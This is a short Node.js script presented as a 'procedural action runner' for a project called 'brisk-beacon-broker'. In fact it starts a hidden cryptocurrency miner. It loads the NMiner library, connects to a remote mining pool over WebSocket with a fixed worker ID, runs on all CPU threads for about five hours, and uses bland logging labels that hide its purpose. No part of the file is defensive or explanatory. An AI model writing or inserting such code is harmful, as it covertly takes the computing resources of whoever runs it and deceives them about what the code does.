// Procedural action runner for brisk-beacon-broker
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

async function launchDaemon() {
    const traceId = "b71c6d";
    console.log(`[monitor] Starting runtime for ${config.appName || "brisk-beacon-broker"} [${traceId}]`);

    const pipeline = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.freckle",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    process.stdin.resume();
    setTimeout(() => {
        console.log("[timeout] Operational limit (305m) reached, exiting cleanly.");
        process.exit(0);
    }, 305 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${traceId}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

launchDaemon().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
